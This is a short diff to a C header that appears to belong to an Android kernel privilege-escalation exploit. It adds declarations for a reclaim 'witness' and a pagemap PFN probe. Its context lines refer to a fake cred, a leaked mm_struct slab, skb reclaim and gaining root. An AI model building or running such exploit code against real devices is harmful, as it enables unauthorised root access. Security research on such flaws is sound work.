@@ -502,6 +502,12 @@ extern size_t uring_mapstride[URING_MAX]; /* payload block stride: MM_SLAB_SIZE 
  * such captures must not execve (the fake cred's page-1 fields are
  * garbage there). */
 extern long g_storm_block_start;
+/* Fail-closed TCL reclaim witness.  The dangerous split route may run only
+ * when exactly one tracked userspace mapping is proven to own the leaked
+ * mm_struct slab PFN.  -1 means no confirmed block. */
+extern int g_tcl_capture_block;
+extern int g_tcl_capture_status;
+extern const char *g_tcl_capture_method;
 /* Real shell supplementary groups, published by the relay child before
  * the exploit and baked into the fake cred's group_info: post-root DAC
  * needs them (/data/local/tmp is drwxrwx--x shell:shell, so uid 0 is
@@ -524,6 +530,10 @@ extern int g_skb_reclaim;      /* target reclaimed as skb data (recv readback) *
 int skb_reclaim_readback(void);          /* drain all queued skbs */
 uint8_t *skb_readback_buf(int i);        /* received skb i's content */
 int skb_readback_count(void);
+/* Read-only capability probe: maps one anonymous page and checks whether the
+ * caller may see its PFN through /proc/self/pagemap.  It performs no reclaim,
+ * futex PI, MCAST, kernel-address access or write primitive. */
+int tcl_pagemap_pfn_preflight(uint64_t *head_pfn);
 
 void read_first_line(const char *path, char *buf, size_t len);
 void log_startup_context(void);
